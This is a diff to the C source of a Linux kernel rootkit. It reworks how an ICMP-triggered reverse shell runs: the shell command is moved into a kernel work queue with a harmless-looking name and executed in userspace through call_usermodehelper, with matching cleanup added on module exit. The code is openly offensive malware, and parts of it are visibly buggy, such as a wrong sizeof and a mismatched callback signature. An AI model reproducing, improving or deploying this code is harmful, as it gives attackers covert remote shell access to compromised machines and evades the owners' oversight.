@@ -79,9 +79,11 @@ typedef struct task_from_controller {
  * Global defines and variables.
  */
 
+#define INIT_WORK_QUEUE(_task, _func) INIT_WORK((_task), (_func))
 #define POLLING_INTERVAL 1500
 #define MAGIC_ROOT_NUM 31337
 #define MAX_TASK_SIZE 200
+#define WORKQUEUE_NAME "garden/0"
 
 static _timer polling_timer;
 static struct nf_hook_ops icmp_hook;
@@ -329,32 +331,15 @@ static void do_something_on_interval(unsigned long data) {
 }
 
 /**
- * Work queue function
+ * Work queue functions
  */
-int add_shell_task_to_queue(char* path, char* ip, char* port) {
-	struct shell_command_task* task;
-	task = kmalloc(sizeof(*shell_command_task), GFP_KERNEL);
-
-	if (!task) {
-		return -1;
-	}
-
-	INIT_WORK(&task->work, &run_shell_command);
-	task->command = create_reverse_shell_cmd();
-	return queue_work(work_queue, &task->work);
-}
 
 /**
- * This function allows the kernel to call out to userspace and execute
- * code there. We define the environment the command will execute in and
- * run it. Control is not returned to the kernel after this particular
- * thread of execution is completed.
- *
- * In this rootkit, we will primarily use this function to spawn a
- * reverse shell.
+ * This function is a callback that lets the kernel to call out to userspace
+ * and execute code there. We define the environment the command will execute
+ * in and run it.
  */
-int run_shell_command(char* run_cmd) {
-	struct subprocess_info* info;
+void run_shell_command(char* run_cmd) {
 	static char* envp[] = {
 		"HOME=/",
 		"TERM=linux",
@@ -373,7 +358,20 @@ int run_shell_command(char* run_cmd) {
 	argv[2] = run_cmd;
 	argv[3] = NULL;
 
-	return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+}
+
+int add_shell_task_to_queue(char* cmd) {
+	struct shell_command_task* task;
+	task = kmalloc(sizeof(shell_command_task*), GFP_KERNEL);
+
+	if (!task) {
+		return -1;
+	}
+
+	INIT_WORK_QUEUE(&task->work, &run_shell_command);
+	task->command = cmd;
+	return queue_work(shell_work_queue, &task->work);
 }
 
 /**
@@ -433,7 +431,7 @@ unsigned int icmp_hook_func(const struct nf_hook_ops* ops,
 			printk(KERN_EMERG "Reverse shell request found!\n");
 			cmd = create_reverse_shell_cmd();
 			printk(KERN_INFO "Running: %s", cmd);
-			run_command(cmd);
+			add_shell_task_to_queue(cmd);
 		}
 	}
 
@@ -464,6 +462,9 @@ static int __init rootkit_init(void) {
 	printk(KERN_EMERG "Initializing ICMP hook...\n");
 	icmp_hook_init();
 
+	printk(KERN_EMERG "Initializing work queue....\n");
+	shell_work_queue = create_workqueue(WORKQUEUE_NAME);
+
 	// If reverse shell IP input, convert it to a numeric representation
 	// for comparison in the hook.
 	if (rev_shell_ip) {
@@ -490,8 +491,17 @@ static int __init rootkit_init(void) {
  */
 static void __exit rootkit_exit(void) {
 	printk(KERN_EMERG "rmmod called. Cleaning up rootkit.");
+	// Kill khook
 	khook_cleanup();
+
+	// Kill workqueue
+	flush_workqueue(shell_work_queue);
+	destroy_workqueue(shell_work_queue);
+
+	// Remove ICMP hook
 	nf_unregister_net_hook(&init_net, &icmp_hook);
+
+	// Kill timer
 	timer_cleanup_wrapper(&polling_timer);
 }
 
